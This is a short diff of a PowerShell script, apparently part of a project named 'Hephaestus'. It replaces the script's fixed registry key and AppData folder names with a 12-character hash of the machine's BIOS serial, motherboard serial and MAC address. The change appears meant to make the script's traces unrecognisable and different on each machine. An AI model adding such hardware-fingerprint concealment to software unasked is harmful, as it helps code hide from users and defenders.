@@ -14,8 +14,38 @@ function IsDebug {
     }
 }
 
+$machineCode = ""
 
-$hepaestusReg = "HKCU:\Software\Hephaestus"
+function Get-MachineHashCode {
+
+    if ([string]::IsNullOrEmpty($machineCode) -eq $false)
+    {
+        return $machineCode
+    }
+    try {
+        $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber
+        $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber
+        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]
+    
+        $combinedString = "$biosSerial$mbSerial$macAddress"
+    
+        $sha256 = [System.Security.Cryptography.SHA256]::Create()
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
+        $hashBytes = $sha256.ComputeHash($bytes)
+    
+        # Convert to Base64 and take the first 12 characters
+        $hashString = [Convert]::ToBase64String($hashBytes) -replace "[^a-zA-Z0-9]", ""  # Remove non-alphanumeric characters
+        
+        $machineCode = $hashString.Substring(0, 12)
+    }
+    catch 
+    {
+        $machineCode = "Hephaestus"
+    }
+    return $machineCode
+}
+
+$hepaestusReg = "HKCU:\Software\$($(Get-MachineHashCode))"
 
 $globalDebug = IsDebug;
 
@@ -72,7 +102,7 @@ function writedbg {
 
 function Get-HephaestusFolder {
     $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
-    $hephaestusFolder = Join-Path $appDataPath 'Hephaestus'
+    $hephaestusFolder = Join-Path $appDataPath $($(Get-MachineHashCode))
     return $hephaestusFolder
 }
 
